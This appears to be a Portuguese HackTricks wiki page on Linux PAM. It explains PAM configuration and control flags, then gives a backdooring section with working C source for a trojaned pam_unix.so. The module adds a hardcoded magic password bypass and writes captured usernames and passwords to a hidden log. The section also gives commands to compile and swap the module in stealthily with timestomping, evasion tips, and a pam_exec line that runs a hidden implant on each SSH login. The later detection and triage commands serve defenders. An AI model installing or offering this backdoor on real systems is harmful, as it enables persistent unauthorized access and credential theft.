# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Informações Básicas

**PAM (Pluggable Authentication Modules)** atua como um mecanismo de segurança que **verifica a identidade dos usuários que tentam acessar serviços do computador**, controlando seu acesso com base em vários critérios. É semelhante a um porteiro digital, garantindo que apenas usuários autorizados possam interagir com serviços específicos e, possivelmente, limitando seu uso para evitar sobrecarga do sistema.

#### Arquivos de Configuração

- **Solaris and UNIX-based systems** normalmente utilizam um arquivo de configuração central localizado em `/etc/pam.conf`.
- **Linux systems** preferem uma abordagem por diretório, armazenando configurações específicas de serviço em `/etc/pam.d`. Por exemplo, o arquivo de configuração para o serviço `login` está em `/etc/pam.d/login`.

Um exemplo de configuração PAM para o serviço de login pode ser assim:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Reinos de Gerenciamento do PAM**

Esses reinos, ou grupos de gerenciamento, incluem **auth**, **account**, **password** e **session**, cada um responsável por diferentes aspectos do processo de autenticação e do gerenciamento de sessão:

- **Auth**: Valida a identidade do usuário, frequentemente solicitando uma senha.
- **Account**: Lida com a verificação da conta, checando condições como pertencimento a grupos ou restrições por horário.
- **Password**: Gerencia atualizações de senha, incluindo checagens de complexidade ou prevenção contra ataques de dicionário.
- **Session**: Gerencia ações no início ou no fim de uma sessão de serviço, como montar diretórios ou definir limites de recursos.

#### **Controles de Módulo PAM**

Os controles ditam a resposta do módulo ao sucesso ou à falha, influenciando o processo geral de autenticação. Eles incluem:

- **Required**: A falha de um módulo required resulta em falha eventual, mas somente depois que todos os módulos subsequentes forem verificados.
- **Requisite**: Termina imediatamente o processo em caso de falha.
- **Sufficient**: O sucesso permite ignorar o restante das verificações do mesmo reino, a menos que um módulo subsequente falhe.
- **Optional**: Só causa falha se for o único módulo na pilha.

#### Exemplo de Cenário

Em uma configuração com vários módulos auth, o processo segue uma ordem estrita. Se o módulo `pam_securetty` detectar que o terminal de login não está autorizado, logins de root são bloqueados, ainda assim todos os módulos são processados devido ao seu status "required". O `pam_env` define variáveis de ambiente, potencialmente melhorando a experiência do usuário. Os módulos `pam_ldap` e `pam_unix` trabalham juntos para autenticar o usuário, com `pam_unix` tentando usar uma senha previamente fornecida, aumentando a eficiência e a flexibilidade dos métodos de autenticação.


## Backdooring PAM – Hooking `pam_unix.so`

Um truque clássico de persistência em ambientes Linux de alto valor é **trocar a biblioteca PAM legítima por um trojanised drop-in**. Porque todo login SSH / console acaba chamando `pam_unix.so:pam_sm_authenticate()`, algumas linhas de C são suficientes para capturar credenciais ou implementar um *magic* password bypass.

### Guia Rápido de Compilação
<details>
<summary>Exemplo de `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Compilar e substituir furtivamente:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Dicas de OpSec
1. **Atomic overwrite** – escreva em um arquivo temporário e `mv` para o local para evitar bibliotecas parcialmente escritas que poderiam bloquear o SSH.
2. A colocação do arquivo de log, como `/usr/bin/.dbus.log`, mistura-se com artefatos de desktop legítimos.
3. Mantenha as exportações de símbolos idênticas (`pam_sm_setcred`, etc.) para evitar comportamento inesperado do PAM.

### Detecção
* Compare MD5/SHA256 de `pam_unix.so` com o pacote da distro.
* `rpm -V pam` or `debsums -s libpam-modules` para identificar bibliotecas substituídas sem hashing manual.
* Verifique se há world-writable ou propriedade incomum em `/lib/security/`.
* Regra do `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Procure nas configs do PAM por módulos inesperados: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Comandos de triagem rápida (post-compromise or threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Abusando de `pam_exec` para persistência
Em vez de substituir `pam_unix.so`, uma abordagem mais sutil é acrescentar uma linha `pam_exec` em `/etc/pam.d/sshd` para que todo login SSH inicie um implant, mantendo a stack normal intacta:
```bash
# Prepend to /etc/pam.d/sshd
session optional pam_exec.so quiet /usr/local/bin/.ssh_hook.sh
```
`pam_exec` executa como root dentro do contexto PAM do sshd, então o script pode drop reverse shells, coletar env vars ou reabrir sockets implantados sem alterações no filesystem ou nas core libraries.


## Referências

- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)

{{#include ../../banners/hacktricks-training.md}}
